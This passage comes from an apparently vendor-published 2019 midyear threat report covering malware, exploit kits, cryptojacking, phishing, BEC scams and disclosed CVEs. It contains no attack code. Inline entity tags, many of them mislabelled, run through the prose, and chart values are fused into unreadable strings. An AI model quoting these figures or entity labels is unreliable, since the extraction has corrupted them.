capability to execute remote code.48 Even more exploits were used by a variant of [ORG] Mirai : [CARDINAL] 13 exploitsin a single attack , employed by the malware to spread to routers and other devices associated with theinternet of things ( [ORG] IoT ) . And as if that was not enough , it also had capabilities for brute - forcing thesedevices using a list of commonly used credentials.49Multistage and multilayered malware infections are difficult to detect , as they can find refuge withinroutinely used files or programs and can thus be easily overlooked , especially if a security mechanism islimited to only inspecting a specific malicious routine . It does not help that as more of these advancedand stealthy threats crop up , fewer people are available to tackle them \u2014 to the extent that according toa survey we commissioned and published in [DATE] March , [PERCENT] nearly 50 % of organizations are contending with acybersecurity skills shortage.50Another interesting and related trend we saw was mobile ransomware \u2019s periodic shifts between fileencryption and information theft . Anubis , for example , had ransomware - like [PERSON] capabilities51 but could alsoserve as banking [ORG] malware.52 Its latest iterations actually retained both routines , but its operators seemedto be focusing on [CARDINAL] one depending on their campaigns or targets \u2014 or perhaps they were just going wherethe money was.53 After all , old ransomware families like [NORP] SMSLocker and [GPE] Svpeng had also operated asbanking malware.54Exploit kits remain a credible threatAfter a period of subdued activity , the [ORG] ShadowGate campaign resurfaced in [DATE] June to deliver cryptocurrencyminers using an upgraded version of the Greenflash Sundown exploit kit that was now capable of livingoff the land , that is , using an updated [ORG] PowerShell loader to filelessly execute the payload . Its last notableactivity was in [DATE] April [DATE] 2018 , when it used the exploit kit to briefly spread cryptocurrency - mining malwareacross servers in [GPE] East [GPE] Asia.5511 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , [ORG] Pervasive [ORG] EffectsGreenflash Sundown \u2019s resurgence in particular is a sign of things to come in the exploit kit landscape . Users and enterprises , therefore , should not allow themselves to be lulled into complacency by suchfactors as threat actors \u2019 lack of access to zero - day exploits and the curtailed reliance on platforms thatexploit kits capitalize on . Telemetry from the Trend Micro Smart Protection Network showed that exploit kit - related activities rosein [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 , continuing the increase seen in [DATE] 2018 . The further rise , though , was still a far cryfrom [DATE] several [DATE] years [DATE] ago , when exploit kits were at their peak and the instances of blocked access to sitesthat hosted them were on the order of millions.56 Be that as it may , the observed increase suggested thatexploit kits were still having some success despite exploiting old vulnerabilities , likely reinforced by thevarious payloads and proofs of concept that they could incorporate.350K321,941275,848136,202100K1H [DATE] 2019Figure [DATE] 7 . Despite an erratic presence , exploit kit activities were still significant : Half - [DATE] year comparison of instances of blocked access to URLs hosting exploit kitsSocial media and networking platforms abused to hide cybercriminal trailsSocial media certainly had been no stranger to abuse . Our [DATE] 2017 research on fake news showed how itcould be misused to help instigate protests , discredit journalists , and even manipulate national policiesor influence [GPE] elections.57 But the notable trend we observed in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 was the abuse ofsocial media channels along with collaboration platforms and networks , including those widely used bydevelopers and information security professionals , as part of a threat \u2019s kill chain or other schemes . The Slub backdoor , for example , abused [PERSON] Slack and [PERSON] Github : the former , a popular web - based collaborationand messaging platform , as an intermediary between the malicious actors and their victims , and the latter , a web - based collaboration and version - control platform for developers , as a repository for maliciouscode.58 There was also a hacking group whose modus operandi was to steal popular profiles on [GPE] Instagramthrough phishing , and then drawing the attention of the true owners by defacing the stolen accounts andextorting money or nude images from them.5912 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , [ORG] Pervasive [ORG] EffectsTwitter , another popular social media site , also figured in the strategy of the operators of the [NORP] XLoaderAndroid malware , who concealed their command - and - control ( [ORG] C&C ) servers by encoding the C&Caddresses in [PRODUCT] Twitter account [CARDINAL] names.60 Tech support scams also caught on , as they were seen usingsocial media channels to bait unfortunate users into handing out personally identifiable information ( PII),downloading questionable software , or even being charged for fake services.61Social media provides feature- and content - rich platforms that can serve as additional avenues forinformation security professionals to gather actionable threat intelligence.62 But as these incidents haveshown , it can also be abused by malicious actors to obfuscate their activities . Therefore , as enterprisesuse social media to promote their brands and expand their reach , they should extend their cybersecuritystrategies to their social media channels , given the security and privacy risks \u2014 data breach , impersonation , and phishing , among others.13 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , Pervasive EffectsTargeted attacks employ more tried - and - tested techniques than new onesTargeted attacks had been considered to be at the forefront of innovating tactics , techniques , andprocedures ( TTPs ) . But the notable campaigns we saw in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 indicated otherwise . [ORG] Themore noticeable use of relatively old and established TTPs was perhaps due to their efficiency \u2014 after all , creating malware with new routines took time and resources . Moreover , targeted attacks could accomplishtheir cyberespionage - driven goals by living off the land . The Bouncing Golf campaign , for example , used the known technique of repackaging legitimate apps . The apps \u2019 distribution was notable , however , as they were hosted on neither official nor [ORDINAL] third - party appmarketplaces , but rather were hosted on a website that was promoted on social media.63 The [NORP] TA505cybercriminal group also did not have to rope in novel techniques to its campaigns . It had an arsenal oftried - and - tested mechanisms at its disposal : hacking tools , macro malware ( including malicious macrosembedded in [ORG] Microsoft [ORG] Excel [CARDINAL] 4.0 ) , trojans , downloaders , and backdoors.64,65 By deploying large - scalespam campaigns and regularly revamping its distribution methods , it remained a persistent threat toenterprises . The [ORG] MuddyWater cyberespionage campaign banked on known techniques too : spear - phishing emails , watering hole , macro malware , and [ORG] PowerShell abuse.66 Its attacks might not be using zero - day exploitsor sophisticated malware , but they managed to affect their targets by persistently luring victims intodownloading and opening their backdoor - embedded documents.67 Most recently , the campaign wasseen using a multistage [ORG] PowerShell - based backdoor called [LAW] Powerstats v3 and [CARDINAL] 13 open - source post - exploitation tools to further carry out routines like dumping credentials or gaining administration rightsafter compromising a system.68That these campaigns \u2019 apparently old tricks still proved effective against their targets only highlighted theneed for enterprises to reexamine or renew their cybersecurity strategies \u2014 from improving awarenessamong employees and patching vulnerable systems to assigning only the necessary privileges across thewhole network infrastructure.14 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , Pervasive [ORG] EffectsIllicit actors continue to bank on cryptocurrency mining Cryptocurrency - mining malware is still the most detected threatDespite a decrease in detections that continued from [DATE] 2018 , data from the [ORG] Trend [ORG] Micro [ORG] Smart [ORG] ProtectionNetwork infrastructure showed that cryptocurrency - mining malware was still the most detected threat [DATE] inthe [DATE] first [DATE] half [DATE] of [DATE] 2019 in terms of file - based threat components . Signs of strength of and upbeat sentiment toward cryptocurrencies perhaps were driving cybercriminalsinto engaging in illicit cryptocurrency mining ( aka cryptojacking ) . For [CARDINAL] one thing , the value of bitcoin , arguably the best - known cryptocurrency in the world , increased over [DATE] the [DATE] last [DATE] several [DATE] months , peaking [MONEY] ataround US$ 12,000 in [DATE] late [DATE] June \u2014 triple its value at the start of the year.69Monero also tripled in value from [DATE] the [DATE] start [DATE] of [DATE] the [DATE] year [DATE] to [DATE] late [DATE] June , albeit reaching its highest pointat just US$ [MONEY] 117.70 Still , it continued to be quite popular among cybercriminals , even becoming theirpreferred cryptocurrency for mining [PERSON] malware.71 That [PERSON] Monero had been cybercriminals \u2019 cryptocurrencyof choice was no surprise , considering that [PERSON] Monero had been known to provide near - total anonymity.72Monero could also be viably mined without using dedicated hardware or custom rigs , like those used inbitcoin mining.731M787,146563,805307,7030.2M1H 2019Figure 8 . Despite the downward trend , cryptocurrency - mining malware was still the most detected threat in terms offile - based threat components : Half - [DATE] year comparison of detections of file - based cryptocurrency - miningmalware - related threat components15 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , Pervasive EffectsCryptocurrency - mining threats further evolve with complex routinesCryptocurrency - mining threats also acquired some degree of maturity . Many of them were seen usingadvanced hacking tools , modular malware , and intricate infection chains typically associated with targetedattacks or information theft campaigns . In [DATE] February , we reported on an apparent [PRODUCT] Korkerds copycat Linux threat that removed cryptocurrencyminers from affected systems and installed its own cryptocurrency - mining malware.74 In [DATE] the [DATE] same [DATE] month , we also shared our findings on a cryptocurrency - mining threat that used the hacking tools [PERSON] Radmin [PERSON] andMimikatz to harvest credentials and gain administrator rights \u2014 and even took pains to hide its trailsby concealing its activities under randomly named files and mounting its attacks during [DATE] holidays ( whencompanies would be unlikely to make the necessary detections).75As we reported in [DATE] April , we also discovered a campaign that employed multiple propagation techniquesto execute the [ORG] PCastle script , which in turn dropped a [PERSON] Monero miner onto victimized systems.76 [PERSON] Whilewe detected this campaign across a handful of countries , its ensuing spate of attacks , which we firstobserved in [DATE] May , reverted to its initial target : systems based in [GPE] China . This time , however , it used amultilayered fileless approach to execute PCastle.77Several cryptocurrency - mining threats manifestly took advantage of security gaps . A vulnerability inthe widely used Confluence collaboration software was exploited to deliver a cryptocurrency miner thatcontained a rootkit designed to hide its activities.78 There were also cryptocurrency - mining botnet malwarevariants that used open ports as entry points to spread to other Android devices79 and incorporated a Perl - based backdoor component that was capable of launching distributed denial - of - service ( DDoS ) attacks.80Yet another evolution we observed was the use of malware written in the open - source programminglanguage Go ( aka [PERSON] Golang ) that scanned machines running vulnerable software to spread its cryptocurrencyminer payload.81Malicious cryptocurrency mining cashes in on servers and cloud environmentsIf in [DATE] 2017 and [DATE] 2018 malicious cryptocurrency - mining activities were largely occupied with techniques toget their malware into systems , [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 showed a noticeable incidence of cryptocurrency - mining malware deployed on servers and , as we predicted , in cloud environments.82 Cryptocurrency - mining threats to cloud infrastructures continued to gain traction among illicit actors , entailing the abuseof compromised container platforms and the use of malicious [PERSON] Docker images , among other [GPE] vectors.8316 | [DATE] 2019 [ORG] Midyear [ORG] Security Roundup : [ORG] Evasive [ORG] Threats , [ORG] Pervasive [ORG] EffectsAs we reported in [DATE] March , a Docker Control API was being abused by a service that had a [PERSON] Monero mineras its payload . The service \u2019s malicious activities involved searching for an exposed or misconfiguredcontainer image , which then enabled the attacker to abuse the API to execute commands , such as creatingnew containers with an attacker - specified image.84 We reported a similar incident in [DATE] May : We discoveredthat a publicly accessible [ORG] Docker [ORG] Hub repository was hosting images that included cryptocurrency - mining software binaries and a script that was probably used to look for more API - exposed [PERSON] Docker hoststo infect.85Also in [DATE] May , a cryptocurrency - mining campaign was reported to have been exploiting a vulnerability in theweb framework used by the Jenkins automation server to execute the Kerberods malware , which in turndeployed [PERSON] Monero - mining malware on affected systems.86 [WORK_OF_ART] A [WORK_OF_ART] Jenkins vulnerability was also exploited in aprior incident , reported in [DATE] early [DATE] 2018 , involving the [ORG] JenkinsMiner malware , which was said to have earnedits operators over [CARDINAL] 10,800 [PERSON] Monero , or [MONEY] at [MONEY] least US$ [MONEY] 3 [MONEY] million at the time of its discovery.87The shift was driven by several factors . [CARDINAL] One was that endpoint security had moved ahead in termsof detecting and blocking cybercriminals \u2019 cryptocurrency - mining threats running on individualmachines . Another was the shutdown in [DATE] March of [ORG] Coinhive,88 an otherwise popular service that letusers mine cryptocurrency by embedding scripts on websites , which meant a significant loss to thecybercriminals \u2019 toolkit . Servers and cloud - based platforms are more than just viable alternatives . Public cloud infrastructures , for instance , are an attractive target . Even a multitude of devices or endpoints can not deliver the samededicated and nearly unlimited resources a cloud infrastructure can provide . For cybercriminals , it isa gold mine \u2014 one that may be unguarded or unsecured at that . And they are only too willing to takeadvantage of gaps such as those brought about by misconfiguration to deploy and spread their malware . Cryptojacking may not be as destructive as ransomware . But its impact on enterprises goes beyond thestealthy theft of computing power or issues of system performance . For cloud deployments , in particular , it can translate to higher usage bills , especially if usage quotas are exceeded . And it can mean wearand tear of hardware and higher electric energy consumption for on - premise servers or data centers . Moreover , the availability , integrity , and stability of systems used to schedule or run specific tasks can beundermined when cryptocurrency miners are deployed in them.89Malicious actors want their cryptocurrency - mining malware on as many systems as possible while stayingunder the radar . The longer their activities are hidden , the more money they can make . Given their threats\u2019increased sophistication of routines and broadening scale of deployment , having greater visibility andcontrol over systems can help organizations better identify the activities and processes running in theironline infrastructures.17 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , Pervasive EffectsExposed and unsecure cloud environments show their ripple effectThreats to cloud environments , including those initiated by malicious actors engaged in illicitcryptocurrency mining , usually take advantage of misconfiguration and weakly secured credentials \u2014 oft - overlooked security risks that are , in fact , a major concern particularly in application componentsand [ORG] APIs.90 [ORG] Misconfigurations have a ripple effect beyond their immediate impact : An unsecure API , forexample , can invite threat actors who are constantly looking , through network - scanning tools and the like , for vulnerable or misconfigured APIs that they can abuse . In a cloud - based environment , misconfiguration means that a cloud instance is set up in such a way thatit becomes susceptible to breaches . In [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 , for example , cloud - based infrastructuresstoring sensitive data were discovered to have been lacking password protection91 or found with neitherauthentication nor firewall security.92While misconfiguration may sound easy to fix , setting up a cloud instance , let alone an entire cloudinfrastructure , is actually a complex task that requires specialized knowledge . And if the task is not doneproperly , any security mechanism running within the cloud environment will not be able to fully deterattackers from hacking into it . This is particularly true for organizations adopting [ORG] DevOps , an approachand set of practices focusing on agile development and release life cycles,93 which are compelled toquickly create and deliver their applications or products while also complying with auditing , monitoring , and data privacy regulations such as [ORG] the [ORG] General [ORG] Data [ORG] Protection [ORG] and [ORG] Regulation ( GDPR ) of the [ORG] EuropeanUnion ( EU).9418 | [DATE] 2019 [ORG] Midyear [ORG] Security Roundup : [ORG] Evasive [ORG] Threats , [ORG] Pervasive [ORG] EffectsMessaging threats further diversify Phishing sites spoofing [ORG] Office 365 markedly increasePhishing activities decreased in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 , based on data from the [ORG] Trend [ORG] Micro [ORG] Smart [ORG] ProtectionNetwork infrastructure . Taking into account our numbers from [DATE] the [DATE] second [DATE] half [DATE] of [DATE] 2018 , we noted a [CARDINAL] 9%drop in instances of blocked access to non - unique phishing - related URLs \u2014 which counted all detectedattempts to visit the sites \u2014 and an [PERCENT] 18 % decline in instances of blocked access to phishing URLs byunique client [ORG] IP address \u2014 which indicated the number of users who would otherwise have been affected.150M143,216,038126,038,109114,516,401100M1H [DATE] 2019Figure [DATE] 9 . Detected attempts to visit phishing - related sites continued to decline : Half - [DATE] year comparison of instances of blocked access to non - unique phishing [ORG] URLs(e.g . , [CARDINAL] three instances of blocked access to the same URL counted as three)19 | 2019 Midyear Security Roundup : Evasive Threats , [NORP] Pervasive Effects12M11,275,9949,341,1877,668,3406M1H [CARDINAL] 2019Figure [CARDINAL] 10 . The number of users who would have been affected by phishing - related sites further decreased : Half - [DATE] year comparison of instances of blocked access to phishing URLs by unique client [ORG] IP address(e.g . , [CARDINAL] one machine that attempted to access a URL [CARDINAL] three times was counted as one)The downturn could have certain dynamics at play , such as improved user awareness on phishing scams . Interestingly , though , comparing our data from [DATE] the [DATE] second [DATE] half [DATE] of [DATE] 2018 and [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 , wesaw a 76 % increase in the number of blocked unique phishing URLs that spoofed [ORG] Microsoft [ORG] Office 365,particularly Outlook . An apparent corroboration of this trend could be found in a research that determinedthat [PERCENT] 29 % of organizations had their Office 365 accounts compromised in [DATE] March , resulting in [CARDINAL] more [CARDINAL] than1.5 [CARDINAL] million malicious spam emails sent from the hacked accounts in [DATE] that [DATE] month alone.95 This trend waspossibly buoyed by cybercriminals who found and favored cloud - based or mobile platforms such [DATE] asOffice [DATE] 365 as avenues for scamming users and enterprises.80K58,32532,59933,10320K1H 2019Figure 11 . The number of blocked unique phishing URLs that spoofed Office 365 ( including Outlook)increased by 76 % : Half - [DATE] year comparison of unique Office 365 - related phishing URLs blocked20 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , [ORG] Pervasive [ORG] EffectsFor cybercriminals , this pronounced refocus meant diversifying into polymorphic and multiplatformsocial engineering threats.96 As we reported in [DATE] January , some [ORG] Android apps promised unwitting users toenable them to spruce up their photos but instead redirected them to phishing sites and stole the photosthey were trying to beautify.97 In [DATE] March , we discovered a phishing campaign that used the watering holetechnique \u2014 performing reconnaissance to compromise a target \u2019s website \u2014 to put up fake login formsdesigned to pilfer user credentials.98 And in another campaign , which we reported on in [DATE] April , phishersabused [ORG] SingleFile , an extension for [PERSON] Google [PERSON] Chrome and [ORG] Mozilla [ORG] Firefox , to obfuscate their fraudulent loginpages , including [CARDINAL] one that spoofed a popular payment processing website.99Also in [DATE] March , [ORG] the [ORG] Oregon [ORG] Department [ORG] of [ORG] Human [ORG] Services announced that the personal health informationof [CARDINAL] more [CARDINAL] than [CARDINAL] 350,000 clients were exposed after a phishing attack that most likely gave hackers accessto employees \u2019 email accounts.100 And cybercriminals continued to deliver malware by hijacking existingemail threads , as exemplified by an evolution of [PERSON] Emotet reported on in April101 \u2014 the trick was previouslyseen [DATE] last [DATE] year being pulled by a campaign that delivered the Ursnif malware.102By hijacking existing email threads , malicious actors can make their scams more believable to unwittingrecipients , as opposed to creating new emails that can be more easily flagged as fraudulent . By turningan organization \u2019s own data or assets against its own employees , they can carry out their attacks withoutanyone suspecting that something is amiss . These attacks can be further complicated by techniquessuch as employing uncommonly used files103 and abusing [ORG] legacy104 or even supposedly secure protocols.105Business email compromise scams continue to thriveScams that rely on business email compromise ( [ORG] BEC ) may be far simpler than the technically advancedmalware involved in phishing or targeted attacks : At the very least , [ORG] BEC scams need only exhibit familiarityand mimic well - established business interactions . But they do rely quite heavily on social engineeringtechniques , such as pretending to be a high - level executive \u2014 typically the CEO \u2014 and prodding therecipients \u2014 usually employees who can conduct wire transfers \u2014 with a sense of urgency . And if theFBI \u2019s recent report is any indication , falling prey to them has become costlier than ever . The figures released by the [ORG] FBI \u2019s [ORG] Internet [ORG] Crime [ORG] Complaint [ORG] Center ( IC3 ) showed that [ORG] BEC schemes hadbeen very lucrative for the scammers behind them . The agency determined that companies in the [GPE] U.S.lost over US$ 1.2 [MONEY] billion to [ORG] BEC or email account compromise ( EAC ) scams in [DATE] 2018 , based on the morethan 20,000 related complaints that it received throughout the year.106Based on our data , [ORG] BEC attempts thrived well into [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 , increasing by 52 % from [DATE] thesecond [DATE] half [DATE] of [DATE] 2018 . And as in [DATE] the [DATE] previous [DATE] half - [DATE] year , businesses in the [GPE] U.S. , [GPE] Australia , and the U.K.encountered the most [ORG] BEC attempts . While they might be reflective of the distribution of our customerbase , these countries had been home to many large enterprises and multinational headquarters , and thusmade sense as locations for scammers to direct their [ORG] BEC attempts at.21 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , Pervasive EffectsUnsurprisingly , the CEO remained the most spoofed position in [ORG] BEC scams , far ahead of other figures ofauthority within [PRODUCT] companies.10K6,8788,5065,5944K1H [PRODUCT] 2019Figure [PRODUCT] 12 . BEC attempts increased : Half - [DATE] year comparison of [ORG] BEC attemptsNote : Data refers to the number of [ORG] BEC attempts seen , which does not indicate whether the attacks were successful . BEC attempts consist of CEO fraud . TOTAL 8,506United StatesAustraliaUnited KingdomNew ZealandCanadaOthers39.0%27.2%11.4%4.1%3.6%14.7%Figure [CARDINAL] 13 . More [ORG] BEC attempts were seen in countries considered as business hubs : Distribution of BEC attempts in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 by countryNote : Data refers to the number of [ORG] BEC attempts seen , which does not indicate whether the attacks were successful . BEC attempts consist of CEO fraud.22 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , Pervasive EffectsCEOManaging [ORG] Director/ DirectorPresidentGeneral Manager/ ManagerChairmanOthers40.8%19.9%11.5%9.7%1.3%16.8%Figure [CARDINAL] 14 . The CEO was still the most spoofed position in [ORG] BEC attempts : Distribution of spoofed positions in [ORG] BEC attempts in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019Note : Data refers to a sample set of [ORG] BEC attempts seen , which does not indicate whether the attacks were successful . BEC attempts consist of CEO fraud . BEC scammers started out with relatively simple methods , which usually involved just hacking or spoofingthe email accounts of C - level executives to fraudulently wire money . But they have since broadened theirhorizons , as illustrated by a number of incidents in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 \u2014 including ones that affected apublic relations agency,107 the regional office of a multinational,108 and even a school district.109The [ORG] London [ORG] Blue group , most notably , have over [DATE] the [DATE] years targeted other employees such as financecontrollers and executive assistants,110 while other fraudsters have targeted human resource personnel111 \u2014 a trend foretold by our prediction that [ORG] BEC attempts would be targeting positions several levels downthe organizational hierarchy.112 There has also been a noticeable shift in targets from traditional enterprisestoward nonprofit and religious organizations , as evidenced by a [ORG] BEC scam in [DATE] April that cost a churchin [GPE] Ohio US$ 1.75 [MONEY] million ; the scammers managed to compromise the email accounts of a couple ofemployees , which they then used to dupe other members of the organization into transferring funds intoan account claiming to be that of a contractor.113Sextortion schemes via spam surgeIn [PERSON] April,114 [PERSON] the [ORG] FBI reported that sextortion constituted the majority of extortion - related complaints itreceived in [CARDINAL] 2018.115 Toward [DATE] the [DATE] end [DATE] of [DATE] last [DATE] year , we issued a prediction that in [DATE] 2019 there would bean increased incidence in digital extortion schemes , particularly sextortion.116 Sure enough , data fromthe [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection [ORG] Network infrastructure showed a whopping 319 % increase , from thesecond half of [DATE] 2018 to [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 , in detections of sextortion - related spam emails . A notable example of sextortion in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 was a spam campaign we saw in [DATE] April that mainlytargeted [NORP] Italian - speaking users , threatening them with the prospect of sending compromising videos totheir contacts unless they sent their payments in time.11723 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , Pervasive EffectsThe use of fear and the sensitive nature of sextortion schemes can intimidate victims into giving in tosextortionists \u2019 demands . These schemes will not be going away anytime soon , and may even see furthersignificant activity , if their recent numbers are anything to go by.10M2,188,41502H 20189,160,8561H 2019Figure [CARDINAL] 15 . Sextortion schemes via spam more than quadrupled : Half - [DATE] year comparison of detections of sextortion - related spam emails24 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , Pervasive EffectsPervasive vulnerabilities make patching even more important More hardware - level vulnerabilities disclosedThe disclosure , at [DATE] the [DATE] start [DATE] of [DATE] 2018 , of [ORG] Meltdown and [PERSON] Spectre \u2014 security flaws related to the speculativeexecution of CPU instructions in certain microprocessors118 \u2014 added a new dimension to the challengesof mitigating and patching vulnerabilities . Indeed , even devices fitted with processors from as early as1995 could be affected,119 making the potential impact of the vulnerabilities pervasive . Seemingly outof the blue , hardware - level vulnerabilities gained some relevance in the predominantly software - basedcybersecurity landscape , which saw the disclosure of even more such flaws . In [DATE] February [DATE] of [DATE] this [DATE] year , researchers showed a proof of concept that could enable hackers to concealtheir malware from antivirus solutions by using enclaves in Intel \u2019s [ORG] Software [ORG] Guard [ORG] Extensions ( [ORG] SGX ) , a setof instructions found in Intel \u2019s [ORG] Core [ORG] and [ORG] Xeon CPUs . Designed to protect and restrict access to data inthem , enclaves could be abused by hackers by putting malicious code in them and embedding them inapplications that could then be unwittingly installed by [ORG] users.120In [ORG] May , researchers disclosed several microarchitectural data sampling vulnerabilities in modern Intelprocessors . Their impact was demonstrated through the side - channel attacks ZombieLoad , [WORK_OF_ART] Fallout , andRogue In - Flight Data Load ( RIDL ) , with methods similar to those of [PERSON] Meltdown and [GPE] Spectre . These side - channel attacks could enable hackers to execute code or exfiltrate data that were otherwise protected bythe processors \u2019 architectural mechanisms.121Disclosure of high - impact vulnerabilities is more pronouncedUbiquity characterized the vulnerabilities disclosed during [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 , given how pervasive theirimpact could be . Indeed , the majority of the vulnerabilities reported through our Zero Day Initiative ( ZDI)program were rated high in severity.25 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , Pervasive EffectsOne of the most notable was [PRODUCT] BlueKeep ( CVE-2019 - 0708 ) , a critical vulnerability in remote desktopservices , which made headlines in [DATE] May due to its \u201c wormability \u201d \u2014 its successful exploitation could letmalware propagate in a way similar to how [ORG] WannaCry used EternalBlue.122 The risk it posed was sosignificant that [ORG] Microsoft even rolled out patches for the out - of - support operating systems [PRODUCT] Windows [PRODUCT] 2003and Windows XP.123Separately , also in [DATE] May , a security researcher , going by the handle [ORG] SandboxEscaper , published exploitcode for a then - zero - day vulnerability ( CVE-2019 - 1069 ) in [FAC] Windows [FAC] 10 \u2019s [FAC] Task [FAC] Scheduler . Affecting [CARDINAL] 32 - and 64 - bit Windows 10 , Windows Server [DATE] 2016 and [DATE] 2019 , and even Windows 8 , the vulnerability could letattackers escalate their privileges to access normally protected files.124None ( 0.0)0Low(0.1 - 3.9)107Medium ( [TIME] 4.0 - 6.9)101High ( [CARDINAL] 7.0 - 8.9)335Critical ( 9.0 - 10.0)40Table 2 . While there might be relatively few vulnerabilities that were rated critical , many of the reportedvulnerabilities had pervasive impact : Severity breakdown , based on [ORG] Common [ORG] Vulnerability [ORG] Scoring [ORG] System ( CVSS)v3.0 , of vulnerabilities disclosed in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 through our ZDI programThe disclosure of vulnerabilities in container platforms and in tools especially used by [ORG] DevOpsprofessionals was also more pronounced . It was not unexpected , given the increased adoption of thesekinds of software . But the risks the vulnerabilities posed also highlighted the importance of incorporatingsecurity into workflows or development life cycles as early as possible . Among the most notable was CVE-2019 - 5736 , a vulnerability in [GPE] runC , a runtime component used forcontainer platforms such as [PERSON] Docker and [ORG] Kubernetes . The successful exploitation of this vulnerabilitycould give attackers full control of the host running the container and allow them to deploy a maliciouscontainer in the production environment.125 Another was CVE-2019 - 1002101 , a vulnerability in [GPE] Kubernetes\u2019command - line interface for running commands and managing resources that was actually derived froman earlier vulnerability ( CVE-2018 - 1002100).126 Its successful exploitation could enable hackers to lureusers into downloading a malicious container image , or , by chaining it with another vulnerability , illicitlyaccess a container.127A vulnerability ( CVE-2019 - 9580 ) was also found in [ORG] StackStorm , a workflow automation tool widely used byDevOps teams . It could allow attackers to gain unauthorized access to and carry out arbitrary commandson exposed servers.12826 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , Pervasive EffectsMicrosoft has the most vulnerabilities disclosed ; [ORG] ICS security advisories declineBased on our data , which included input from [CARDINAL] more [CARDINAL] than [CARDINAL] 3,500 independent researchers who contributeto our ZDI program , [ORG] Microsoft issued the most advisories among home and office software vendorsin [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 ; many of these were related to [ORG] Windows , [ORG] Office , and Internet Explorer . Butthe majority of the vulnerabilities disclosed in [DATE] the [DATE] half - [DATE] year were related to software used in industrialcontrol systems ( ICSs).Compared to the second half of 2018 , however , there was a 36 % decrease in [ORG] ICS software - relatedvulnerabilities disclosed in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 . The decrease could be due to several factors : overallimprovement in cybersecurity awareness , patching ecosystems , and timely and responsible disclosurespresumably in compliance with regulations and directives such as [ORG] the [ORG] Network [ORG] and [ORG] Information [ORG] Service(NIS ) Directive , which had been requiring operators of critical infrastructures in the [ORG] EU to improve theirsecurity posture.129Interestingly , [CARDINAL] nearly [CARDINAL] half of the [ORG] ICS software - related vulnerabilities , including those in supervisory controland data acquisition ( [ORG] SCADA ) environments , were found in [PERSON] LAquis [PERSON] SCADA software and AdvantechWebAccess . The former software product includes human - machine interfaces ( HMIs ) and the latter isa web - based [ORG] HMI solution . In [GPE] SCADA environments , HMIs are essentially hubs that manage criticalinfrastructures and monitor different control systems that directly influence operations . As such , theyhave become high - value targets for threat actors looking to disrupt business operations . The trouble isthat they can be challenging to secure since they are used not only to manage operational technology(OT ) infrastructures , but also to connect to devices associated with the industrial internet of things ( IIoT)and even to traditional information technology ( IT ) systems \u2014 which can broaden a critical infrastructure\u2019sattack surface.27 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , [ORG] Pervasive [ORG] Effects300202 [CARDINAL] 2019Non - zero - dayZero - dayFigure [CARDINAL] 16 . Disclosures of [ORG] ICS software - related vulnerabilities decreased : Half - [DATE] year comparisonof [ORG] ICS - related vulnerabilities disclosed via our ZDI programVulnerabilities \u2014 be they unknown , known ( n - day ) , or found in legacy systems or software \u2014 are areminder that organizations should not be complacent . There is practically nothing stopping maliciousactors from , say , repurposing exploits for old vulnerabilities , as they can still take advantage of windowsof exposure . In [DATE] April , for instance , attackers were already exploiting a zero - day vulnerability in OracleWebLogic ( CVE-2019 - 2725 ) even before [ORG] Oracle released a patch for it . And with the likes of [PRODUCT] BlueKeepand the critical vulnerability that [ORG] SandboxEscaper divulged , it could take only a single vulnerable systemto affect many others . Immediately patching zero - day and even n - day vulnerabilities is a good practice , but it is not as easy asit sounds . In fact , according to a survey published in [DATE] April , the majority of companies postpone it to avoiddowntime.130 This is further complicated by legacy and embedded systems , such as those used in ICSs , for which patches may no longer be issued.131 Apart from employing additional mechanisms that can helpbridge security gaps , such as virtual patching , it is important for enterprises to have a good grasp of thevulnerabilities that may affect their systems in terms of exploitability132 and real - world risk and [GPE] impact,133so that they may better assess which ones warrant urgent attention.28 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , [ORG] Pervasive [ORG] EffectsIoT and [GPE] IIoT security remains a significant issue [ORG] IoT becomes battleground in incipient botnet and worm warsIt is estimated that the number of [NORP] IoT devices in use will reach [CARDINAL] 25 [CARDINAL] billion by 2021.134 It is not surprising , then , that attackers have been taking advantage of them too . Indeed , [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 was marked by a glut of malware whose capabilities abused such devices . Threat actors capitalized on improper configuration and other forms of weak security in these devices . In fact , based on telemetry from [ORG] the [ORG] Trend [ORG] Micro \u2122 Smart Home Network solution , the number of routersinvolved in possible inbound attacks ( from the internet to the routers and devices connected to them)remained steady compared to [DATE] the [DATE] second [DATE] half [DATE] of [DATE] 2018 , at [CARDINAL] well [CARDINAL] over [CARDINAL] half a million.800K360,061300K1H 2018585,781589,7702H 20181H 2019Figure 17 . Activities on routers , including possible attacks , remained steady : Half - [DATE] year comparison of routers identified to have been involved in possible inbound attacksNote : Possible attacks were detected as high - risk events closely related to threat activity.29 | [DATE] 2019 Midyear Security Roundup : 